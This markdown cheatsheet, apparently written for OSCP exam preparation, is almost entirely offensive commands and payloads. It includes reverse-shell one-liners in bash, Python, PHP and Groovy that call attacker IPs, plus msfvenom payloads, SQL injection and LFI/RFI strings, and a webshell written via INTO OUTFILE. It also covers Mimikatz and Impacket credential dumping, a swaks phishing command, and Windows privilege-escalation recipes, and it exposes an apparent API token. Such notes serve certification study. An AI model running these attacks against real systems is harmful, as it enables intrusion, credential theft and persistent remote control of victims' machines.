# OSCP Cheatsheet

Notes from preparation for OSCP exam. 

# Common commands

## File transfer

### Between Kali and Windows

```bash
# kali
impacket-smbserver -smb2support <sharename> .
# windows
copy file \\KaliIP\sharename
```

### Using Netcat

```bash
# Attacker
nc target_ip 1234 < nc64.exe

# Target
nc -lvp 1234 > nc64.exe
```

### Downloading from Windows

```powershell
bash -command Invoke-WebRequest -Uri http://adversary:port/FILE -Outfile C:\\temp\\FILE
iwr -uri http://adversary:port/file -Outfile file
certutil -urlcache -split -f "http://adversary:port/FILE" FILE
copy \\kali\share\file .
```

### Downloading on Linux

```bash
wget http://adversary:port/FILE
curl http://adversary:port/FILE OUTPUT_FILE
```

## Adding Users

### Windows

```bash
net user adversary Password123 /add
net localgroup Administrators adversary /add
net localgroup "Remote Desktop Users" adversary /add
```

### Linux

```bash
adduser user # Interactive
useradd user
# UID can be something new than existing, this command is to add a user to a specific group
useradd -u UID -g group user  
```

# Tunneling and stuff

![krieger-tick](https://github.com/Br14n41/oscp-stuffs/assets/57382125/5515478d-515a-4d9f-b321-ba98e89eafb3)

## SSH

```bash
# TOR port
ssh pwned@target -i id_rsa -D 9050 

# Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
# Example
proxychains4 crackmapexec smb TARGET 

# Instruct SSH to listen on all interfaces on port 4455 from the compromised host (0.0.0.0:4455),
# then forward all packets to port 445 on the newly-found host (INTERNAL:445).
ssh -N -L 0.0.0.0:4455:INTERNAL:445 user@COMPROMISED

# An example of using the new tunnel
# SMBClient traffic to COMPROMISED:4455 is forwarded to INTERNAL:445, so...
smbclient -p 4455 -L //192.168.1.3/ -U admin --password=Welcome123!

# Dynamic port forwarding
# In OpenSSH, a dynamic port forward is created with the -D option. 
# The -D option takes the IP address and port to bind to. 
# In this case, we want it to listen on all interfaces on port 9999. 
# We don't need to specify a socket address to forward to. 
# The -N flag is used to prevent a shell from being spawned.
# On COMPROMISED...
ssh -N -D 0.0.0.0:9999 user@COMPROMISED

# Remote port forwarding
# Run on COMPROMISED to create an SSH remote port forward as part of an SSH connection back to Kali
# The remote port forward option is -R, with the listening socket defined first and the forwarding socket next.
# Example 1: listen on port 2345 on our Kali machine (127.0.0.1) and forward all traffic to the target machine.
ssh -N -R 127.0.0.1:2345:TARGET:5432 adversary@KALI

# Example 2: open remote port forward through a perimeter machine to open traffic from Kali to INTERNAL
sudo ssh -N -R INTERNAL:7781:EXTERNAL:18890 adversary@KALI 

# Remote dynamic port forwarding, run from COMPROMISED
ssh -N -R 9998 adversary@KALI
# Add line to proxychains
sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
# Example of usage:
proxychains nmap -vvv -sT --top-ports=20 -Pn -n INTERNAL
```

## Ligolo-ng

```bash
# Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Kali machine - Attacker machine (I have proxy placed into /usr/bin)
proxy -selfcert

# To manually set port
proxy -laddr 0.0.0.0:9001 -selfcert

# windows or linux machine - compromised machine
agent.exe -connect LHOST:PORT -ignore-cert -retry

# In Ligolo-ng console
# select host
session
# Notedown the internal network's subnet
ifconfig
# after adding relevent subnet to ligolo interface
start_tunnel

# Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo

```

# Getting the most from discovered passwords

### When you suspect brute forcing or have cracked some hashes:

    - Have a valid usernames first
    - Dont firget trying `admin:admin`
    - Try `username:username` as first credential, 'service:service' (like jenkins:jenkins)
    - If it’s related to a service, try default passwords.
    - Service name as the username as well as the same name for password.
    - Use rockyou.txt

# Attacking Windows

## Impacket

```bash
# We connect to the server rather than a share
impacket-smbclient [domain]/[user]:[password/password hash]@[Target IP Address] 

# User enumeration on target
impacket-lookupsid [domain]/[user]:[password/password hash]@[Target IP Address] 

# Service enumeration
impacket-services [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] 

# Dumping hashes on target
impacket-secretsdump [domain]/[user]:[password/password hash]@[Target IP Address]  

# Kerberoasting, and request option dumps TGS
impacket-GetUserSPNs [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip IP -request  

# Asreproasting, need to provide usernames list
impacket-GetNPUsers test.local/ -dc-ip IP -usersfile usernames.txt -format hashcat -outputfile hashes.txt 

# Automated with https://github.com/Br14n41/asrep-roaster
./asrep-roaster.sh example.com 10.10.10.1 /usr/share/wordlists/users.txt


# RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes lmhash:nthash test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

```

## Evil-Winrm

```bash
# winrm service discovery
nmap -p5985,5986 IP
5985 - plaintext protocol
5986 - encrypted

# Login with password
evil-winrm -i IP -u user -p pass
evil-winrm -i IP -u user -p pass -S # if 5986 port is open

# Login with Hash
evil-winrm -i IP -u user -H ntlmhash

# Login with key
# -c for public key and -k for private key
evil-winrm -i IP -c certificate.pem -k priv-key.pem -S 

# Logs
evil-winrm -i IP -u user -p pass -l

# File upload and download
upload <file>
download <file> <filepath-kali> # not required to provide path all time

# Loading files direclty from Kali location
evil-winrm -i IP -u user -p pass -s /opt/privsc/bash # Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

# evil-winrm commands
# to view commands
menu 

# There are several commands to run
# This is an example for running a binary
evil-winrm -i IP -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

## Mimikatz

```bash
privilege::debug

token::elevate

sekurlsa::logonpasswords # hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt

# both these dump SAM
lsadump::lsa /patch 

# OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```

---

# Port Scanning

```bash
# use -Pn option if you're getting nothing in scan
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $target

# complete scan
nmap -T4 -A -p- IP -v 

# automated with bashmap (https://github.com/Br14n41/bashmap)
./bashmap.sh ips.txt

# NSE
updatedb
locate .nse | grep <name>

# Here we can specify other options like specific ports...etc
sudo nmap --script="name" IP 

# bash utility
Test-NetConnection -Port <port> IP   

# Automating port scan of first 1024 ports in bash
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null 
```

# FTP enumeration

```bash
ftp IP
# login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith Anonymous:password
# don't forget to try ftp:ftp

put <file> # uploading file
get <file> # downloading file

# NSE
locate .nse | grep ftp
nmap -p21 --script=<name> IP

# bruteforce
# '-L' for usernames list, '-l' for username and viceversa
hydra -L users.txt -P passwords.txt IP ftp 

# Uses a combined username:password list (from Proving Grounds)
hydra -v -C /usr/share/seclists/seclists-master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f IP ftp

# check for vulnerabilities associated with the version identified.
```

# SSH enumeration

```bash
# Login
ssh user@IP # enter password in the prompt

# id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh user@IP -i id_rsa/id_ecdsa # if it still asks for password, crack them using John

# cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

# bruteforce
hydra -l user -P passwords.txt IP ssh # '-L' for usernames list, '-l' for username and viceversa

# check for vulnerabilities associated with the version identified.
```

# SMB enumeration

```bash
# Automated
enum4linux -a IP
# IP or range can be provided
sudo nbtscan -r IP

# NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" IP

# In windows we can view like this
net view \\<computername/IP> /all

# crackmapexec
crackmapexec smb <IP/range>  
crackmapexec smb IP -u username -p password
# lists available shares
crackmapexec smb IP -u username -p password --shares 
# lists available users
crackmapexec smb IP -u username -p password --users
# all information
crackmapexec smb IP -u username -p password --all 
# specific port
crackmapexec smb IP -u username -p password -p 445 --shares 
# specific domain
crackmapexec smb IP -u username -p password -d mydomain --shares 

# Instead of username and password, usernames.txt and passwords.txt files may be used for password-spraying or bruteforcing.

# Smbclient
smbclient -L //IP
# or try with 4 /'s

smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username

# SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

# Within SMB session
put <file> # to upload file
get <file> # to download file
```

- Downloading shares made easy - if the folder consists of several files, they all be downloading by this.

```bash
mask ""
recurse ON
prompt OFF
mget *
```

# HTTP/S enumeration

- View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- Fuzzing files/directories
- Check /robots.txt, .DS_store, .git, .svn
- Nikto
- If hostname discovered, add to `/etc/hosts` file.

## Basic HTTP/S Enum
```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u $URL -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
gobuster dir -u $URL -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt -k -t 30
ffuf -c -ic -w /usr/share/wordlists/dirb/big.txt -u $URL
```

## Advanced file/directory fuzzing
```bash
# Authenticated Directory Fuzzing:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -d "SESSIONID=value" "$URL"

# Authenticated File Fuzzing:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt -fc 404 -d "SESSIONID=value" "$URL"

# Fuzzing Directories:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-large-directories.txt -fc 404 "$URL"
ffuf -c -ic -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -fc 404 "$URL"
ffuf -c -ic -w /usr/share/wordlists/dirbuster/big.txt -fc 404 "$URL"

# Fuzzing files:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-large-files.txt -fc 404 "$URL"

# Fuzzing files with large words:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/raft-large-words.txt -fc 404 "$URL"

# Fuzzing for usernames:
ffuf -c -ic -w /opt/seclists/Usernames/top-usernames-shortlist.txt -fc 404,403 "$URL"

# Fuzzing for parameter existence:
ffuf -c -ic -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt "$URL"

```

## Nikto
```bash
# Basic
nikto -h http://$target/

# with SSL and Evasion
nikto --host $IP -ssl -evasion 1
```
- `HTTPS`SSL certificate inspection, this may reveal information like subdomains, usernames…etc
- Default credentials, Identify the CMS or service and check for default credentials and test them out.

## Bruteforce

```bash
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.

# Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

- if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.

## API - Fuzz further and it can reveal some sensitive information
```bash
# identifying endpoints using gobuster
# pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern 

# obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```
- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)

## GitHub

You need to find the `.git` files on the target machine.

```bash
# Log information of the current repository.
git log

# This will display the log of the stuff happened, like commit history which is very useful
git show <commit-id>

# This shows the commit information and the newly added stuff.
```

- If you identify `.git` active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.
- [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)

## Wordpress

```bash
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add Wpscan API to get the details of vulnerabilties.
wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA 

# Accessing Wordpress shell
http://<DOMAIN>/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
http://<DOMAIN>/retro/wp-content/themes/90s-retro/404.php

# WPScan and SSL
wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u

# WPScan Brute forcing
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

# Aggressive Plugin Detection
wpscan --url $URL --enumerate p --plugins-detection aggressive
```

## Drupal

```bash
droopescan scan drupal -u http://site
```

## Joomla

```bash
droopescan scan joomla --url http://site
# https://github.com/ajnik/joomla-bruteforce
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username  
```

## S1ren's Commons

From her walkthrough videos, her common commands available at:
https://sirensecurity.io/blog/common/ 

# DNS enumeration

- Better use `seclists` wordlists for better enumeration. [https://github.com/danielmiessler/seclists/tree/master/Discovery/DNS](https://github.com/danielmiessler/seclists/tree/master/Discovery/DNS)

```bash
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

# DNS Bruteforce
for ip in $(cat list.txt); do host $ip.megacorpone.com; done 
# bash bruteforcer to find domain name
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" 

# DNS Recon
# standard recon
dnsrecon -d megacorpone.com -t std 
# bruteforce, hence we provided list
dnsrecon -d megacorpone.com -D ~/list.txt -t brt 

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

# NSlookup, a gold mine
nslookup mail.megacorptwo.com
# We are querying the information from a specific IP.
nslookup -type=TXT info.megacorptwo.com IP 
```

# SMTP enumeration

```bash
# Version Detection
nc -nv IP 25 
# -M means mode, it can be RCPT, VRFY, EXPN
smtp-user-enum -M VRFY -U username.txt -t IP 

# Sending emain with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# LDAP Enumeration

```powershell
# try on both ldap and ldaps, this is first command to run if you dont have any valid credentials
ldapsearch -x -H ldap://IP:<port> 

ldapsearch -x -H ldap://IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
# CN name describes the info w're collecting
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://IP -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

# windapsearch.py
# for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

# for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

# for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

# for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
```

# NFS Enumeration

```bash
nmap -sV --script=nfs-showmount IP
showmount -e IP
```

# SNMP Enumeration

```bash
# Nmap UDP scan
sudo nmap IP -A -T4 -p- -sU -v -oN nmap-udpscan.txt

# Better version than snmpwalk as it displays more user friendly
snmpcheck -t IP -c public 

# Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 -t 10 IP 
# Windows User enumeration
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25 
# Windows Processes enumeration
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
# Installed software enumeraion 
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2 
# Opened TCP Ports
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3 

# Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

# RPC Enumeration

```powershell
rpcclient -U=user $IP
# Anonymous login
rpcclient -U="" $IP 
# Commands within in RPCclient
srvinfo
# users
enumdomusers 
# like "whoami /priv"
enumpriv 
# detailed user info
queryuser <user> 
# password policy, get user-RID from previous command
getuserdompwinfo <RID> 
# SID of specified user
lookupnames <user>
# Creating a user 
createdomuser <username> 
deletedomuser <username>
enumdomains
enumdomgroups
# get rid from previous command
querygroup <group-RID> 
# description of all users
querydispinfo 
# Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenum 
netshareenumall
# SID of all users
lsaenumsid 
```

---

# RDP

```bash
xfreerdp /u:user /p:'password' /v:$target
xfreerdp /d:domain /u:user /p:'password' /v:$target

# try this option if normal login doesn't work
xfreerdp /u:user /p:'password' /v:$target +clipboard /cert:ignore
```

# Web Attacks

<aside>
Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
</aside>

## Directory Traversal

```bash
# displaying content through absolute path
cat /etc/passwd

# relative path
cat ../../../etc/passwd

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

# In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
# check for id_rsa, id_ecdsa
# If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 

# For windows, no need to provide drive
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt 
```

- URL Encoding

```bash
# Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

- Wordpress
    - Simple exploit: https://github.com/leonjza/wordpress-shell

## Local File Inclusion

- Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.

```bash
# we're passing a command here
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami 

# Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
# We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
# encoded version of above reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 

# PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('user%20-a');?>" 
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
```

## Remote file inclusion

```bash
1. Obtain a php shell
2. host a file server 
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
we can also host a php reverseshell and obtain shell.
```

## SQL Injection

```
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"# 
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1# 
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"# 
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"# 
) or '1`='1-
```

## Blind SQL Injection - This can be identified by Time-based SQLI

```bash
# Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

## Manual Code Execution

```bash
# To login
impacket-mssqlclient Administrator:Password@TARGET -windows-auth 
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
# Now we can run commands
EXECUTE xp_cmdshell 'whoami';

# Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // # Writing into a new file
# Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id # Command execution
```

## SQLMap - Automated Code execution

```bash
# Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user 
# Dumping database
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump 

# OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
# /var/www/html/tmp is the writable folder on target, hence we're writing there
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" 

```

---

# Exploits - Hack the planet!

## Searchsploit

```bash
searchsploit <name>
# Copies the exploit to the current location
searchsploit -m windows/remote/46697.py 
```

## Reverse Shells

```bash
https://www.revshells.com/
```

## Msfvenom

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=IP LPORT=<PORT> -f raw > shell.php
```

## One Liners

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
```php
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
# For bash use the encrypted tool that's in Tools folder
```

<aside>
💡 While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

</aside>

## Groovy reverse-shell

- For Jenkins

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

# Windows Privilege Escalation

<aside>
findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag..
</aside>

## Manual Enumeration commands

```bash
# Groups we're part of
whoami /groups

whoami /all

# Starting, Restarting and Stopping services in bash
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

# bash History
Get-History
# display the path of consoleHost_history.txt
(Get-PSReadlineOption).HistorySavePath 
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\bash\PSReadline\ConsoleHost_history.txt

# Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Process Information
Get-Process
Get-Process | Select ProcessName,Path

# Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# this for a specific user
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 

# Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

## Automated Scripts

```s 
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

## Token Impersonation

- Command to check `whoami /priv`

```bash
# Printspoofer
PrintSpoofer.exe -i -c bash.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

# RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

# SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\Windowsbash\v1.0\bash.exe -a "whoami | Set-Content C:\temp\w.log"
# writes whoami command to w.log file
```

## Binary Hijacking

```python
# Identify service from winpeas
# F means full permission, we need to check we have full access on folder
icalcs "path" 
# find binarypath variable
sc qc <servicename> 
# change the path to the reverseshell location
sc config <service> <option>="<value>" 
sc start <servicename>
```

## Unquoted Service Path

```bash
# Displays services which has missing quotes, this can slo be obtained by running WinPEAS
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ `
# Check the Writable path
icalcs "path"
# Insert the payload in writable location and which works.
sc start <servicename>
```

## Insecure Service Executables

```bash
# In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
# Replace the executable in the service folder and start the service
sc start <service>
```

## Weak Registry permissions

```bash
# Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) # This means we have ful access

accesschk /acceptula -uvwqk <path of registry> # Check for KEY_ALL_ACCESS

# Service Information from regedit, identify the variable which holds the executable
reg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
# Imagepath is the variable here

net start <service>
```

## DLL Hijacking

1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
2. Check whether you have write permissions in the directory associated with the service.
```bash
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll -o filename.dll
# Example (Printconfig.dll)
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.245 LPORT=4444 -f dll -o Printconfig.dll)
# Overwrite Printconfig.dll in:
C:\Windows\System32\spool\drivers\3\
```
3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
4. Start listener and restart service, you'll get a shell.

## Autorun

```bash
# For checking, it will display some information with file-location
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Check the location is writable
accesschk.exe \accepteula -wvu "<path>" # returns FILE_ALL_ACCESS

# Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell
```

## AlwaysInstallElevated

```bash
# For checking, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=<port> --platform windows -f msi > reverse.msi

# Execute and get shell
msiexec /quiet /qn /i reverse.msi
```

## Schedules Tasks

```bash
# Displays list of scheduled tasks, Pickup any interesting one
schtasks /query /fo LIST /v 
# Permission check - Writable means exploitable!
icalcs "path"
# Wait till the scheduled task in executed, then we'll get a shell
```

## Startup Apps

```bash
# Startup applications can be found here
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
# Check writable permissions and transfer
# The only catch here is the system needs to be restarted
```

## Insecure GUI apps

```bash
# Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
# Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe 
```

## SAM and SYSTEM

- Check in following folders

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
